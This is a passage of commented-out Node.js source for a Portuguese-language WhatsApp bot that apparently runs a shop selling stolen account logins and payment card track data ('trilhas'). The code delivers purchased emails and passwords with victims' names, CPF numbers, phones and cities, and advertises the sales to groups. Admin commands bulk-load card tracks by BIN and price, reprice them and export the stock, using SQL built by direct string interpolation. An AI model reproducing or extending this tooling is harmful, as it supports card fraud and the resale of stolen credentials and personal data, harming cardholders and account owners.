            //                         URL_plan = `https://docs.google.com/forms/d/e/${ID_FORMULARIO_LOG_LOGINVENDA}/formResponse?entry.${ENTRY_FORM_LOG_LOGINVENDA1}=${Mensagem_Nome_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA2}=${Numero}&entry.${ENTRY_FORM_LOG_LOGINVENDA3}=${SERVICO_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA4}=${DADOS_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA5}=${PRECO_LOGIN}&entry.${ENTRY_FORM_LOG_LOGINVENDA6}=${NOVO_SALDO}&entry.${ENTRY_FORM_LOG_LOGINVENDA7}=${new Date(parseInt(Date.now())).toLocaleString()}&entry.${ENTRY_FORM_LOG_LOGINVENDA8}=${new Date(parseInt(Date.now() + 2629800000)).toLocaleString()}`
            //                     }
            //                     var options = {
            //                         'method': 'POST',
            //                         'url': URL_plan,
            //                         rejectUnauthorized: false,
            //                     };
            //                     request(options, function (error, response) {
            //                         if (error) throw new Error(error);
            //                         console.log(`Logs enviados para planilha.`);
            //                     });
            //                 }


            //                 MENSAGEM_AO_COMPRAR_LOGIN = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MENSAGEM_AO_COMPRAR_LOGIN'`).get()["VALOR"]

            //                 if (CPF.toString() === "§") {
            //                     Texto_Usuario = `📱 *LOGIN COMPRADO COM SUCESSO* 📱

            // ⏰ *DATA DA COMPRA:* ${new Date(parseInt(Date.now())).toLocaleString()}
            // ⏰ *DATA RENOVAÇÃO:* ${new Date(parseInt(Date.now() + 2629800000)).toLocaleString()}

            // 💰 *VALOR LOGIN:* R$: ${PRECO_LOGIN}

            // ⚜️ *${SERVICO}* ⚜️

            // ${ADICIONAIS}
            // ═══════❖═══════
            // ${MENSAGEM_AO_COMPRAR_LOGIN}`
            //                 } else if (CPF.toString() === "§§") {
            //                     Texto_Usuario = `📱 *LOGIN COMPRADO COM SUCESSO* 📱

            // ⏰ *DATA DA COMPRA:* ${new Date(parseInt(Date.now())).toLocaleString()}
            // ⏰ *DATA RENOVAÇÃO:* ${new Date(parseInt(Date.now() + 2629800000)).toLocaleString()}

            // 💰 *VALOR LOGIN:* R$: ${PRECO_LOGIN}

            // ⚜️ *${SERVICO}* ⚜️

            // Ⓜ️EMAIL: ${EMAIL}
            // 🔐SENHA: ${SENHA}

            // ${ADICIONAIS}
            // ═══════❖═══════
            // ${MENSAGEM_AO_COMPRAR_LOGIN}`

            //                 } else {
            //                     Texto_Usuario = `📱 *LOGIN COMPRADO COM SUCESSO* 📱

            // ⏰ *DATA DA COMPRA:* ${new Date(parseInt(Date.now())).toLocaleString()}
            // ⏰ *DATA RENOVAÇÃO:* ${new Date(parseInt(Date.now() + 2629800000)).toLocaleString()}

            // 💰 *VALOR LOGIN:* R$: ${PRECO_LOGIN}

            // ⚜️ *${SERVICO}* ⚜️

            // Ⓜ️EMAIL: ${EMAIL}
            // 🔐SENHA: ${SENHA}
            // 👤NOME: ${NOME}
            // 👤CPF: ${CPF}
            // 👤USER: ${USER}
            // 📱TELEFONE: ${TELEFONE}
            // 🏞️ESTADO: ${ESTADO}
            // 🏭CIDADE: ${CIDADE}

            // ${ADICIONAIS}
            // ═══════❖═══════
            // ${MENSAGEM_AO_COMPRAR_LOGIN}`

            //                 }
            //                 await client.sendText(Mensagem_From, Texto_Usuario).then(async (result) => {
            //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            //                 }).catch(async(erro) => {
            //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
            //                 });

            //                 Texto_Grupo = `📱 *USUÁRIO COMPROU UMA LOGIN* 📱

            // 👤 *USUÁRIO:* wa.me/${Numero}

            // 💰 *VALOR LOGIN:* R$: ${PRECO_LOGIN}

            // ⚜️ *${SERVICO}* ⚜️

            // *VENHA ADQUIRIR OS MELHORES LOGINS DO MERCADO!*

            // *ATENDIMENTO 100% AUTOMÁTICO!*

            // Este é o número do BOT, mande qualquer mensagem!
            // wa.me/${NUMERO_PURO_BOT}
            // `

            //                 NOT_COMPROU_LOGIN = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_COMPROU_LOGIN'`).get()["VALOR"]
            //                 if (NOT_COMPROU_LOGIN === "1") {
            //                     for await (Grupo of ID_GRUPOS) {
            //                         try {
            //                             await client.sendImage(Grupo["ID_GRUPO"], FOTO_Comprou_Login_GP, 'foto', Texto_Grupo).then(async (result) => {
            //                             }).catch(async(erro) => {
            //                                 console.error('Error when sending: ', erro);
            //                             });
            //                         } catch (error) {
            //                         }
            //                     }
            //                 }

            //                 Texto_Adms = `📱 *LOGIN COMPRADO COM SUCESSO* 📱

            // 👤 *NÚMERO DO USUÁRIO:* wa.me/${Numero}

            // 💰 *VALOR LOGIN:* R$: ${PRECO_LOGIN}

            // ⚜️ *${SERVICO}* ⚜️

            // Ⓜ️EMAIL: ${EMAIL}
            // 🔐SENHA: ${SENHA}
            // 👤NOME: ${NOME}
            // 👤CPF: ${CPF}
            // 👤USER: ${USER}
            // 📱TELEFONE: ${TELEFONE}
            // 🏞️ESTADO: ${ESTADO}
            // 🏭CIDADE: ${CIDADE}

            // ${ADICIONAIS}
            // `

            //                 for await (adm of Adms) {
            //                     Texto = Texto_Adms
            //                     await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
            //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            //                     }).catch(async(erro) => {
            //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
            //                     });
            //                 }

            //                 Item_Fila_Sendo_Processado_MS = Date.now()

            //                 console.log(`Login Comprado! Numero: wa.me/${Numero} | Valor: ${PRECO_LOGIN}`)
            //                 return;
            //             }
            //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        }

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 

        //addtrilha===BIN===CPF===LEVEL===PRECO===TUDO_DA_TRILHA
        //addtrilha===544731===99999999999===226===150===COLA TUDO DA TRILHA AQUI
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if (Mensagem_Texto.indexOf("/addtrilha===") > -1 && Adms.includes(Numero)) {
        //             Forcar_AMEX = true
        //             Forcar_MULTIPLO_ELO = false
        //             Forcar_HIPERCARD_HIPERCARD = false
        //             Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
        //             msg = Mensagem_Texto.split("===")

        //             if (msg[1] === "") {
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }

        //             Mensagem_Textoa = Mensagem_Texto.replace(/\'/igm, "")

        //             Array_Fila_Espera = []
        //             try {
        //                 await client.sendText(Mensagem_From, "*ABASTECENDO TRILHA...*").then(async (result) => {

        //                     Linhas = Mensagem_Textoa.split("/addtrilha===")
        //                     Linhas.splice(0, 1);
        //                     try {
        //                         Contagem_Abastecidas = 0

        //                         db = new sqlite3.Database(Diretorio_SQLITE_Principal);
        //                         db.serialize(async function () {
        //                             db.run("begin transaction");

        //                             for (var index = 0; index < Linhas.length; index++) {
        //                                 Abastecendo = true

        //                                 try {

        //                                     Div = Linhas[index].split("===")

        //                                     console.log(`Inserindo: ${Div[0]}`)

        //                                     BIN = Div[0]
        //                                     CPF = Div[1]
        //                                     LEVEL = Div[2]
        //                                     PRECO = Div[3]
        //                                     TUDO_DA_TRILHA = Div[4]

        //                                     Regex = new RegExp(BIN + ".*", 'igm')
        //                                     INFO_BINS = ARQUIVO_BINS.match(Regex)

        //                                     if (INFO_BINS === null) {
        //                                         BANDEIRA = "OUTROS"
        //                                         TIPO = "OUTROS"
        //                                         NIVEL = "OUTROS"
        //                                         BANCO = "OUTROS"
        //                                         PAIS = "OUTROS"
        //                                     } else {
        //                                         console.log(INFO_BINS[0])
        //                                         Div_Infos = INFO_BINS[0].split(";")

        //                                         BANDEIRA = Div_Infos[1]
        //                                         TIPO = Div_Infos[2]
        //                                         NIVEL = Div_Infos[3]
        //                                         if (BANDEIRA.indexOf("AMEX") > -1 || BANDEIRA.indexOf("AMERICAN") > -1) {
        //                                             if (Forcar_AMEX === true) {
        //                                                 NIVEL = "AMEX"
        //                                             }
        //                                         }
        //                                         if (BANDEIRA.indexOf("ELO") > -1) {
        //                                             if (Forcar_AMEX === true) {
        //                                                 NIVEL = "ELO"
        //                                             }
        //                                         }

        //                                         if (NIVEL.indexOf("MULTIPLO") > -1) {
        //                                             if (Forcar_MULTIPLO_ELO === true) {
        //                                                 NIVEL = "ELO"
        //                                             }
        //                                         }

        //                                         if (BANDEIRA.indexOf("HIPERCARD") > -1) {
        //                                             if (Forcar_HIPERCARD_HIPERCARD === true) {
        //                                                 NIVEL = "HIPERCARD"
        //                                             }
        //                                         }
        //                                         BANCO = Div_Infos[4]
        //                                         PAIS = Div_Infos[5]
        //                                     }
        //                                     DATA_MS_INSERIDO = Date.now()

        //                                     db.run(`INSERT INTO TRILHAS (BIN,CPF,LEVEL,PRECO,TUDO_DA_TRILHA,BANDEIRA,TIPO,NIVEL,BANCO,PAIS,DATA_MS_INSERIDO) VALUES ('${BIN}','${CPF}','${LEVEL}','${PRECO}','${TUDO_DA_TRILHA}','${BANDEIRA}','${TIPO}','${NIVEL}','${BANCO}','${PAIS}','${DATA_MS_INSERIDO}') ON CONFLICT DO NOTHING`);
        //                                     Contagem_Abastecidas = parseInt(Contagem_Abastecidas) + 1
        //                                 } catch (error) {
        //                                     console.log(error)

        //                                     for await (adm of Adms) {
        //                                         Texto = `*Ocorreu algum problema no abastecimento.*

        // Já tinha abastecido ${Contagem_Abastecidas}.

        // Erro: ${error}`
        //                                         await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                                             Abastecendo = false
        //                                             return
        //                                         }).catch(async(erro) => {
        //                                             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                                         });
        //                                     }
        //                                     return
        //                                 }
        //                             }

        //                             if (Contagem_Abastecidas != 0) {
        //                                 //console.log("comitando")
        //                                 db.run("commit");
        //                             }

        //                             for await (adm of Adms) {
        //                                 Texto = `*ABASTECIMENTO FINALIZADO*

        // ${Linhas.length} Trilhas abastecidas!
        // `, `${adm}@c.us`
        //                                 await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                                 }).catch(async(erro) => {
        //                                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                                 });
        //                             }
        //                             Abastecendo = false
        //                             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                         });
        //                     } catch (error) {
        //                         Texto = `Erro === ${error}`
        //                         await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                         }).catch(async(erro) => {
        //                             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                         });
        //                     }
        //                 })
        //                     .catch((error) => { console.log(debugLine("Error when sending = " + (JSON.stringify(error)))); });
        //             } catch (error) {
        //                 Texto = `Erro === ${error}`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if (Mensagem_Texto.indexOf("/valortrilhaporid===") > -1 && Adms.includes(Numero)) {
        //             try {
        //                 Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
        //                 if (Array_Total_Igual.length != 6) {
        //                     Texto = `Comando inválido CODE:1`
        //                     await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                     return
        //                 }

        //                 msg = Mensagem_Texto.split("===")
        //                 ID = msg[1]
        //                 NOVO_VALOR = msg[2]
        //                 NOVO_VALOR = parseFloat(NOVO_VALOR).toFixed(2);

        //                 if (ID === "") {
        //                     Texto = `Comando inválido CODE:2`
        //                     await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                     return
        //                 }
        //                 if (NOVO_VALOR === "") {

        //                     Texto = `Comando inválido CODE:3`
        //                     await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                     return
        //                 }

        //                 PRECO_ANTERIOR = await DataBase_Better.prepare(`SELECT PRECO FROM TRILHAS WHERE _rowid_ = '${ID}'`).get()["PRECO"]
        //                 PRECO_ANTERIOR = parseFloat(PRECO_ANTERIOR).toFixed(2);

        //                 await DataBase_Better.prepare(`UPDATE TRILHAS SET PRECO = '${NOVO_VALOR}' WHERE _rowid_ = '${ID}'`).run()

        //                 for await (adm of Adms) {
        //                     Texto = `*Preço Trilha do ID: ${ID} alterado com sucesso!*

        // *Valor anterior:* ${PRECO_ANTERIOR}

        // *Valor atual:* ${NOVO_VALOR}`
        //                     await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                 }
        //             } catch (error) {

        //                 Texto = `Comando inválido! CODE:${error}`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //             }
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        // if (Mensagem_Texto.indexOf("/baixarestoquetrilhas") > -1 && Adms.includes(Numero)) {
        //     Texto = `Gerando arquivo...`
        //     await client.sendText(Mensagem_From, Texto).then(async (result) => {

        //         Array_MATERIAL = await DataBase_Better.prepare(`SELECT * FROM TRILHAS`).all();
        //         //shuffle(Array_MATERIAL);

        //         today = new Date();
        //         today.setHours(today.getHours() + 0);
        //         Nome_File_Visual = `${Nome_Dono} ${Array_MATERIAL.length} Trilhas Data ${today}.txt`
        //         Nome_File_Visual = Nome_File_Visual.replace(/\\/igm, '/');
        //         Nome_File_Visual = Nome_File_Visual.replace(/\s\(Horário Padrão de Brasília\)/igm, '');
        //         Nome_File_Visual = Nome_File_Visual.replace(/\sGMT\-0300/igm, '');
        //         Nome_File_Visual = Nome_File_Visual.replace(/\:/igm, ' ');

        //         Nome_File = __dirname + `\\Pacotes\\${Nome_File_Visual}`
        //         message = fs.createWriteStream(Nome_File);
        //         for (var index = 0; index < Array_MATERIAL.length; index++) {
        //             console.log(`${Array_MATERIAL[index]["BIN"]}|${Array_MATERIAL[index]["CPF"]}|${Array_MATERIAL[index]["LEVEL"]}|${Array_MATERIAL[index]["PRECO"]}|${Array_MATERIAL[index]["TUDO_DA_TRILHA"]}`)
        //             message.write(`${Array_MATERIAL[index]["BIN"]}|${Array_MATERIAL[index]["CPF"]}|${Array_MATERIAL[index]["LEVEL"]}|${Array_MATERIAL[index]["PRECO"]}|${Array_MATERIAL[index]["TUDO_DA_TRILHA"]}\n`);
        //             if (index === parseInt(Array_MATERIAL.length) - 1) {
        //                 //console.log("Foi")
        //                 await delay(2000)
        //                 await client.sendFile(Mensagem_From, Nome_File, Nome_File_Visual, "Texto_Usuario").then(async (result) => {
        //                 }).catch(async(erro) => {
        //                     console.error('Error when sending: ', erro);
        //                 });
        //             }
        //         }
        //     }).catch(async(erro) => {
        //         console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
        //     });
        //     return
        // }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

